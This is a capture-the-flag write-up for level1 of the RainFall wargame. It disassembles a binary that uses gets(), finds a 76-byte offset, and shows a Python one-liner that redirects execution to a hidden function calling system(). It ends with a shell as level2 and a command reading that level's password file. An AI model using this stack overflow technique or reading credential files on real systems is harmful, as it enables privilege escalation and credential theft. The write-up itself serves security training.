**Basic examination**

Again, only one file, "level1" to run. Let's try it.
~~~bash
./level1
|
~~~
Exacutable waits for the user input and than exits. 

**Assembly dump analysis**

The assembly dump for a main function in **gdb** tool will show us more:
~~~assembly
   0x08048480 <+0>:	push   %ebp
   0x08048481 <+1>:	mov    %esp,%ebp
   0x08048483 <+3>:	and    $0xfffffff0,%esp       ;stack allignment up to this point.
   0x08048486 <+6>:	sub    $0x50,%esp             ;allocates 80 bytes (0x50 in hex) to the stack
                                                  ;there would be some variable declared with memory allocated.
   0x08048489 <+9>:	lea    0x10(%esp),%eax    
   0x0804848d <+13>:	mov    %eax,(%esp)           ;moves the addressin EAX (buffer) to the top of the stack
   0x08048490 <+16>:	call   0x8048340 <gets@plt>  ;calls the gets function (reads the line of input from user
                                                   ;and stores it into the buffer.
   0x08048495 <+21>:	leave
   0x08048496 <+22>:	ret                          ;pops the return address from the stack and jumps to it
~~~

As we can see, the main allocates 80 bytes on the stack, calculates the pointer to the buffer for gets, calls gets and returns, with no other procedures. This looks like a dead end and we need to examine further, so we list all the functions in gdb, using **info functions** command. From the listing, **run()** looks like our way forward, as also the assembly dump suggest by calling a system function:
~~~assembly
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	sub    $0x18,%esp
   0x0804844a <+6>:	mov    0x80497c0,%eax
   0x0804844f <+11>:	mov    %eax,%edx
   0x08048451 <+13>:	mov    $0x8048570,%eax
   0x08048456 <+18>:	mov    %edx,0xc(%esp)
   0x0804845a <+22>:	movl   $0x13,0x8(%esp)
   0x08048462 <+30>:	movl   $0x1,0x4(%esp)
   0x0804846a <+38>:	mov    %eax,(%esp)
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>      ;writing a message
   0x08048472 <+46>:	movl   $0x8048584,(%esp)
   0x08048479 <+53>:	call   0x8048360 <system@plt>      ;calling system function, pattern that we identified in the                                                            ;previous level
   0x0804847e <+58>:	leave  
   0x0804847f <+59>:	ret  
~~~
There is no direct call from **main** to run run(), so we need to somehow force the execution workflow to run it. This will be done using **buffer overflow** (stakc frame and principles of buffer overflow beautifully explained [**HERE**](https://www.cameronwickes.co.uk/stack-frames-pointers/).  

## Buffer overflow
The memory address of the run is **0x08048444**as we can see from the previous info functions command in gdb. Now we just need and offset to get the location of the proper position to rewrite in stack frame of the program. We can use some pattern generator (like [**Wiremask**](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) along with gdb to calculate it. Running a program with dummy pattern will give us a segfault, but gdb will tell us it happens at **0x63413563**. We put this to Wiremask tool to find out the offset is 76.
Now we can create a string to send to the program that will contain the memory address of the run() function right after the offset, thus forcing it to execute as return address. We can do this using a simple python script and a pipe to send the output to the program as stdin:
~~~bash
level1@RainFall:~$ python -c 'print "42" * 38 + "\x08\x04\x84\x44"[::-1]' > /tmp/exploit
~~~
Prints 76 bytes + mem address using little endian as proper format (python will reverse bytes using[::-1]) into the file.
~~~bash
level1@RainFall:~$ cat /tmp/exploit - | ./level1
~~~
cats the file as stdin ("-") and sends it to the execution of the program...and...voila!
~~~bash
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
~~~


